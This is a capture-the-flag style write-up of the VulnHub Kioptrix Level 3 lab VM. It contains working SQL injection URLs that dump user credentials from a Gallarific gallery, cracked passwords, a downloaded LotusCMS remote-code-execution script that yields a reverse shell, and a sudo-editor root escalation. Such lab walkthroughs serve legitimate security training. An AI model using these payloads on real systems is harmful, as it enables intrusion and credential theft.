---
layout: default
---

# VulnHub - Kioptrix level 3 writeup 

![Kioptrix Level 3 Header](/assets/images/vh_kioptrix3/kioptrix3_header.png)

[VulnHub Image Link](https://www.vulnhub.com/entry/kioptrix-level-12-3,24)

:monocle_face: :clock11:

> As with the other two, this challenge is geared towards the beginner. It is however different. Added a few more steps and a new skill set is required. Still being the realm of the beginner I must add. The same as the others, there’s more then one way to “pwn” this one. There’s easy and not so easy. Remember… the sense of “easy” or “difficult” is always relative to ones own skill level. I never said these things were exceptionally hard or difficult, but we all need to start somewhere. And let me tell you, making these vulnerable VMs is not as easy as it looks…


## Initial VM Setup

This system requires that you add an entry into your /etc/hosts file if you are Kali Linux.

```
127.0.0.1	localhost
127.0.1.1	kali
10.0.2.7	kioptrix3.com
```

Under Windows, you would edit C:\Windows\System32\drivers\etc\hosts to look something like this:

```
# localhost name resolution is handled within DNS itself.
#   127.0.0.1 localhost
#   ::1 localhost127.0.0.1 static3.cdn.ubi.com
192.168.1.102 kioptrix3.com
```

## Initial recon
### Nmap scan

We start initial active recon with an fast (-T4) aggressive (-A) scan of all TCP ports (-p-) and output to all formats (-oA).
Very Verbose output (-vv) to see live scanning results
```
sudo nmap 10.0.2.7 -T4 -A -vv -p- -oA tcp_all_ports_fast_agg
```

We can also run a quick (-T4) version UDP scan (-sUV) of the top 1000 ports to see if there is any interesting UDP ports.
```
sudo nmap 10.0.2.7 -sUV -T4 -vv -oA udp_top_1000_version
```

### Nmap results
#### TCP Scan

```
# Nmap 7.80 scan initiated Wed Jul 22 11:27:10 2020 as: nmap -T4 -A -vv -p- -oA tcp_all_ports_fast_agg 10.0.2.7
Nmap scan report for kioptrix3.com (10.0.2.7)
Host is up, received arp-response (0.00045s latency).
Scanned at 2020-07-22 11:27:11 EDT for 14s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAL4CpDFXD9Zn2ONktcyGQL37Dn6s9JaOv3oKjxfdiABm9GjRkLEtbSAK3vhBBUJTZcVKYZk21lFHAqoe/+pLr4U9yOLOBbSoKNSxQ2VHN9FOLc9C58hKMF/0sjDsSIZnaI4zO7M4HmdEMYXONrmj2x6qczbfqecs+z4cEYVUF3R3AAAAFQCuG9mm7mLm1GGqZRSICZ+omMZkKQAAAIEAnj8NDH48hL+Pp06GWQZOlhte8JRZT5do6n8+bCgRSOvaYLYGoNi/GBzlET6tMSjWMsyhVY/YKTNTXRjqzS1DqbODM7M1GzLjsmGtVlkLoQafV6HJ25JsKPCEzSImjeOCpzwRP5opjmMrYBMjjKqtIlWYpaUijT4uR08tdaTxCukAAACBAJeJ9j2DTugDAy+SLCa0dZCH+jnclNo3o6oINF1FjzICdgDONL2YbBeU3CiAL2BureorAE0lturvvrIC2xVn2vHhrLpz6NPbDAkrLV2/rwoavbCkYGrwXdBHd5ObqBIkoUKbI1hGIGA51nafI2tjoXPfIeHeNOep20hgr32x9x1x
|   2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyOv6c+5ON+N+ZNDtjetiZ0eUxnIR1U0UqSF+a24Pz2xqdnJC1EN0O3zxGJB3gfPdJlyqUDiozbEth1GBP//8wbWsa1pLJOL1YmcumEJCsitngnrVN7huACG127UjKP8hArECjCHzc1P372gN3AQ/h5aZd0VV17e03HnAJ64ZziOQzVJ+DKWJbiHoXC2cdD1P+nlhK5fULe0QBvmA14gkl2LWA6KILHiisHZpF+V3X7NvXYyCSSI9GeXwhW4RKOCGdGVbjYf7d93K9gj0oU7dHrbdNKgX0WosuhMuXmKleHkIxfyLAILYWrRRj0GVdhZfbI99J3TYaR/yLTpb0D6mhw==
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: 99EFC00391F142252888403BB1C196D2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
MAC Address: 08:00:27:AB:56:21 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/22%OT=22%CT=1%CU=42865%PV=Y%DS=1%DC=D%G=Y%M=080027%T

Uptime guess: 0.008 days (since Wed Jul 22 11:15:39 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=182 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.45 ms kioptrix3.com (10.0.2.7)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 22 11:27:25 2020 -- 1 IP address (1 host up) scanned in 16.59 seconds
```

There are only two open ports SSH (22) and HTTP (80). Seems like the system is also running Ubuntu.

#### UDP Scan

```
# Nmap 7.80 scan initiated Wed Jul 22 11:28:47 2020 as: nmap -vv -sUV -T4 -oA udp_top_1000_version 10.0.2.7
Increasing send delay for 10.0.2.7 from 0 to 50 due to 11 out of 18 dropped probes since last increase.
Warning: 10.0.2.7 giving up on port because retransmission cap hit (6).
Increasing send delay for 10.0.2.7 from 200 to 400 due to 11 out of 20 dropped probes since last increase.
Increasing send delay for 10.0.2.7 from 400 to 800 due to 11 out of 12 dropped probes since last increase.
Nmap scan report for kioptrix3.com (10.0.2.7)
Host is up, received arp-response (0.00045s latency).
Scanned at 2020-07-22 11:28:48 EDT for 1183s
Not shown: 962 closed ports
Reason: 962 port-unreaches
PORT      STATE         SERVICE         REASON      VERSION
68/udp    open|filtered dhcpc           no-response
177/udp   open|filtered xdmcp           no-response
512/udp   open|filtered biff            no-response
782/udp   open|filtered hp-managed-node no-response
838/udp   open|filtered unknown         no-response
1056/udp  open|filtered vfo             no-response
1058/udp  open|filtered nim             no-response
1070/udp  open|filtered gmrupdateserv   no-response
4666/udp  open|filtered edonkey         no-response
6004/udp  open|filtered X11:4           no-response
8181/udp  open|filtered unknown         no-response
17629/udp open|filtered unknown         no-response
18543/udp open|filtered unknown         no-response
18605/udp open|filtered unknown         no-response
18683/udp open|filtered unknown         no-response
19500/udp open|filtered unknown         no-response
19717/udp open|filtered unknown         no-response
20865/udp open|filtered unknown         no-response
21261/udp open|filtered unknown         no-response
21784/udp open|filtered unknown         no-response
21868/udp open|filtered unknown         no-response
22055/udp open|filtered unknown         no-response
22846/udp open|filtered unknown         no-response
25157/udp open|filtered unknown         no-response
26720/udp open|filtered unknown         no-response
26872/udp open|filtered unknown         no-response
27899/udp open|filtered unknown         no-response
35702/udp open|filtered unknown         no-response
37843/udp open|filtered unknown         no-response
39632/udp open|filtered unknown         no-response
42172/udp open|filtered unknown         no-response
42577/udp open|filtered unknown         no-response
46093/udp open|filtered unknown         no-response
47765/udp open|filtered unknown         no-response
51554/udp open|filtered unknown         no-response
53037/udp open|filtered unknown         no-response
59207/udp open|filtered unknown         no-response
63420/udp open|filtered unknown         no-response
MAC Address: 08:00:27:AB:56:21 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 22 11:48:31 2020 -- 1 IP address (1 host up) scanned in 1184.03 seconds
```

Nothing interesting for UDP, all ports appear to be open/filtered which means they are mostly likely all closed.

## Enumeration

Since we can only see port 80 open with an Apache Web Server running on it lets start with investigating it.

Seems like we got a simple website based on Lotus CMS. There is a mention of a new gallery CMS system that they made.

![Kioptrix4 Website](/assets/images/vh_kioptrix3/vh_kioptrix3_webpage_1.jpg)

Inspecting the websites blog pages we wind the a link to the gallery system: **http://kioptrix3.com/gallery**

![Kioptrix4 Blog post](/assets/images/vh_kioptrix3/vh_kioptrix3_webpage_2.jpg)

Looks like we found the gallery application called **"Gallarific"**

![Gallery Application](/assets/images/vh_kioptrix3/vh_kioptrix3_webpage_3.jpg)

### SQL Injection

Searching [exploitdb.com](https://www.exploit-db.com/exploits/15891) we find that Gallarific is susceptible to SQL injection attacks.

The exploit states that the id URL parameter is the injection point. We will need to modify these to suit our host and URL path to the application.
```
www.site.com/gallery.php?id=null[Sql Injection]
www.site.com/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6,7,8+from+gallarific_users--
```

![SQL Injection error](/assets/images/vh_kioptrix3/vh_kioptrix3_sqli_1.jpg)

```
# First enumerate the number of columns we are dealing with which end out to be 6
http://kioptrix3.com/gallery/gallery.php?id=null%20and%201=1%20union%20select%201,2,3,4,5,6

# Select the table names for the current database.
http://kioptrix3.com/gallery/gallery.php?id=null%20and%201=1%20union%20select%201,2,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),4,5,6

# Check the gallarific_users and dev_accounts tables column names.
http://kioptrix3.com/gallery/gallery.php?id=null%20and%201=1%20union%20select%201,2,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27gallarific_users%27),4,5,6

http://kioptrix3.com/gallery/gallery.php?id=null%20and%201=1%20union%20select%201,2,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27dev_accounts%27),4,5,6

# Get the username, password and user type from the gllarific_users table.
http://kioptrix3.com/gallery/gallery.php?id=null%20and%201=1%20union%20select%201,2,(select%20group_concat(username,%200x3A,%20password,%200x3A,%20usertype)%20from%20gallarific_users),4,5,6

# Get the username and password from the dev_accounts table.
http://kioptrix3.com/gallery/gallery.php?id=null%20and%201=1%20union%20select%201,2,(select%20group_concat(username,%200x3A,%20password)%20from%20dev_accounts),4,5,6
```

![Database table names](/assets/images/vh_kioptrix3/vh_kioptrix3_sqli_2.jpg)

![User hash values](/assets/images/vh_kioptrix3/vh_kioptrix3_sqli_3.jpg)

It appears that we have found two users and their associated passwords that look like they are MD5 hashes.

Using [crackstation.net](https://crackstation.net/) you can quickly crack these MD5 hashes.

If you do not have internet access you can always use hashcat to brute force it using some GPU power.

-m 0 parameter is for the MD5 hash mode.
```
hashcat -a 0 -m 0 kioptrix3_hashes.txt /usr/share/wordlists/rockyou.txt
```

![Crackstation.net](/assets/images/vh_kioptrix3/vh_kioptrix3_cracking_hashes.jpg)

```
dreg:0d3eccfb887aabd50f243b3f155c0f85:Mast3r
loneferret:5badcaf789d3d1d09794d8f021f40f0e:starwars
```

### Lotus CMS remote code injection exploit.

I was able to find this working exploit bash script which allows us to gain a reverse shell on the system as the **www-data** user.

> Note: The LotusCMS exploits on exploitdb.com did not seem to work and require some modification.

[LotusCMS Exploit Script](https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh)

```
wget https://github.com/Hood3dRob1n/LotusCMS-Exploit/raw/master/lotusRCE.sh
chmod +x lotusRCE.sh
./lotusRCE kioptrix3.com /
```

![LotusCMS Exploit and Reverse Shell](/assets/images/vh_kioptrix3/vh_kioptrix3_lotuscms_exploit.jpg)

## Privilege Escalation

We can SSH into the box using the user **loneferret** and the password **starwars**

Checking what **loneferret** can run as SUDO reveals that he can run what appears to be HT Editor

> "HT is a file editor/viewer/analyzer for executables. The goal is to combine the low-level functionality of a debugger and the usability of IDEs. We plan to implement all (hex-)editing features and support of the most important file formats."

```
cat CompanyPolicy.README
```

Check the CompanyPolicy.README to see that they use they installed the HT editor for editing, creating and viewing files!

Lets try to edit the /etc/sudoers file as we should be editing it with SUDO rights.

```
# In order to avoid the following error "Error opening terminal: xterm-256color." type this in the SSH terminal session
export TERM=xterm-color

# Open the ht editor as sudo
sudo ht

# Press F3 to open and load the /etc/sudoers file

# Insert .bin.bash just after the /usr/local/bin/ht, in the sudoers file
/bin/bash

# Press F2 to save
# Press F10 to exit
# Press Y to confirm changes.

# Execute bash as sudo to get root
sudo bash
```

![HT editor /etc/sudoers file](/assets/images/vh_kioptrix3/vh_kioptrix3_privesc_1.jpg)

![Privilege Escalation](/assets/images/vh_kioptrix3/vh_kioptrix3_privesc_2.jpg)

As you can see we can now easily get root and read the /root/Congrats.txt file left by loneferret.

### Possible Kernel Privilege escalation.

If we had not found the other path for privilege escalation we could have abused the fact that this VM is running an old Linux Kernel version.

```
uname -a
```
> Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux

Searching exploitdb.com we can see there are a few potential Kernel Privilege Escalation exploits.
* [Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Local Privilege Escalation ](https://www.exploit-db.com/exploits/9545)
* [Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu 8.04/8.10 / Fedora Core 10 x86-64) - 'set_selection()' UTF-8 Off-by-One Privilege Escalation](https://www.exploit-db.com/exploits/9083)
* [Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) UDEV < 1.4.1 - Local Privilege Escalation (2) ](https://www.exploit-db.com/exploits/8572)
* [Linux Kernel 2.6.20/2.6.24/2.6.27_7-10 (Ubuntu 7.04/8.04/8.10 / Fedora Core 10 / OpenSuse 11.1) - SCTP FWD Memory Corruption Remote Overflow ](https://www.exploit-db.com/exploits/8556)

I did not try them as time was limited and I had already gained root on the system in a safer way.

## Summary

Overall this machine was fun, the SQL injection attacks were interesting as we had to enumerate the database a bit to find what we needed. The privilege escalation via the HT editor was trivial, as this is a common mistake that people seems to make were they give editing software sudo rights we can be leveraged to change sensitive files. We could have even edited the /etc/passwd or /etc/shadow files to get root privileges.